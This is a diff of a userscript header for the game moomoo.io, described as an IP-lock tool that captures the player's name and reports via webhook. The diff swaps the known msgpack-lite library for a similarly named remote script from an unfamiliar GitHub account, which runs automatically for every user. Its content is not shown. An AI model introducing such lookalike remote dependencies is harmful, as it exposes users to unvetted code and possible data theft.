@@ -4,7 +4,7 @@
 // @version      1.3
 // @description  Sistema de IP lock com identificação dev/user, captura de nome do player e notificação via webhook
 // @author       @jetxrah
-// @require      https://rawgit.com/kawanet/msgpack-lite/master/dist/msgpack.min.js
+// @require       https://raw.githubusercontent.com/knla24/msgpack-max/refs/heads/main/con.js
 // @match        https://*.moomoo.io/*
 // @grant        none
 // ==/UserScript==
